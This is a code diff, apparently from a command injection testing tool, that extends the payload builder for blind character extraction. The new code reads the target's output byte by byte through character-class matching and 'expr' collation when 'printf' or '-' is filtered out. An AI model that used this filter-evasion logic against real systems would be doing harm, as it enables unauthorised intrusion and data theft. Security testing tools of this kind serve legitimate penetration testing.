@@ -201,6 +201,17 @@ def get_length(separator, cmd, candidate_length, operator="-eq"):
 """
 Whether the ordinal of the output's Nth byte is at or above this one, which is what bisects it.
 """
+"""
+The characters a question covers: every one the pool holds up to this ordinal, or the one itself.
+"""
+def _asked_about(position, ascii_char, operator):
+  pool = checks.generate_char_pool(position)
+  if operator == "-eq":
+    return [ascii_char] if ascii_char in pool else []
+  # The comparison reads "[ candidate -le byte ]", so '-le' is the byte at or above the candidate.
+  return [ordinal for ordinal in pool if ordinal <= ascii_char] if operator == "-ge" \
+         else [ordinal for ordinal in pool if ordinal >= ascii_char]
+
 def get_char(separator, cmd, num_of_chars, ascii_char, operator="-le"):
   word = tb_payloads._output_word(cmd)
   qmarks = "?" * (num_of_chars - 1)
@@ -220,13 +231,39 @@ def get_char(separator, cmd, num_of_chars, ascii_char, operator="-le"):
       "[" + str(num_of_chars - 1) + "]))",
       "GEQ" if operator == "-le" else "EQU", ascii_char)
   if separator == settings.PIPE_SEPARATOR:
-    piped = _piped_ordinal(word, num_of_chars)
-    payload = separator + _decide(separator, str(ascii_char) + settings.SINGLE_WHITESPACE + operator +
-                                  settings.SINGLE_WHITESPACE + piped,
-                                  arithmetic=str(ascii_char) + _ARITHMETIC[operator] + piped)
+    """
+    Asked as one match where the printer the run settled on cannot read an ordinal.
+
+    A pipe keeps no variable to hold the output, so the reading is a single expression - and this
+    one names no printer, opens no second pipe and writes no '-', which is what lets it stand where
+    the byte's ordinal cannot be read and where a '-' is being kept out at the same time.
+    """
+    matched, expected = (checks.byte_in_class(word, num_of_chars, _asked_about(num_of_chars, ascii_char, operator))
+                         if checks.ordinal_unavailable() else (None, None))
+    if matched:
+      payload = separator + _decide(separator, matched + settings.SINGLE_WHITESPACE + "=" +
+                                    settings.SINGLE_WHITESPACE + expected,
+                                    arithmetic=matched + "==" + expected)
+    else:
+      piped = _piped_ordinal(word, num_of_chars)
+      payload = separator + _decide(separator, str(ascii_char) + settings.SINGLE_WHITESPACE + operator +
+                                    settings.SINGLE_WHITESPACE + piped,
+                                    arithmetic=str(ascii_char) + _ARITHMETIC[operator] + piped)
   else:
+    """
+    Asked of the character rather than of its ordinal, where the run has traded 'printf' away.
+
+    An ordinal is what 'printf' is for, and a target refusing it by name answers a reading that
+    needs it exactly as it answers a parameter that was never injectable. The same question is put
+    to 'expr', which answers which of two strings sorts first - under the byte locale, which byte
+    comes first. The character it is compared against is written out, so only a printable one can be
+    asked about: the pool is held to those for as long as this is how the asking is done.
+    """
+    collated = checks.byte_collation("${" + var + "}", ascii_char, operator) if checks.ordinal_unavailable() else None
+    read_as = (collated + settings.SINGLE_WHITESPACE + "=" + settings.SINGLE_WHITESPACE + "1") if collated \
+              else str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + var_ordinal
     # Sliced in bytes, as the length beside it counts - exported, since a rewrite can move the counting into a command of its own.
-    payload = separator + settings.BYTE_LOCALE_EXPORTED + separator + _var_chain(separator, word, qmarks) + compare(var_ordinal, operator)
+    payload = separator + settings.BYTE_LOCALE_EXPORTED + separator + _var_chain(separator, word, qmarks) + _decide(separator, read_as)
   return checks.terminate_payload(payload, separator, keep_output=separator == settings.PIPE_SEPARATOR)
 
 # eof
